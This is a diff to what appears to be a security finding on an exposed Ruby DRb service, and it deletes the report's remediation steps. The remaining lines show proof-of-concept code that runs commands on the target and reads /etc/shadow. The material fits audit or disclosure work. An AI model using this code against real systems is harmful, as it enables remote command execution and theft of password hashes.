@@ -44,25 +44,3 @@ obj = DRbObject.new_with_uri('druby://TARGET:8787')
 puts obj.exec_command('id')       # Executes 'id' on the target
 puts obj.read_file('/etc/shadow') # Reads /etc/shadow
 ```
-
-## Remediation Steps
-1. **Option A - Add ACL to restrict access to trusted hosts only:**
-   ```ruby
-   require 'drb/drb'
-   require 'drb/acl'
-
-   acl = ACL.new(%w[deny all allow 127.0.0.1 allow localhost])
-   DRb.install_acl(acl)
-
-   URI = "druby://127.0.0.1:8787"
-   DRb.start_service(URI, DRbService.new)
-   ```
-2. **Option B - Bind to localhost only:**
-   Change the URI from `druby://0.0.0.0:8787` to `druby://127.0.0.1:8787`
-3. **Option C - Stop and disable the service entirely:**
-   ```
-   pkill -f drb_service.rb
-   rm /opt/drb/drb_service.rb
-   ```
-4. Remove the dangerous `exec_command` and `read_file` methods from the service
-   object if the DRb service must remain running.
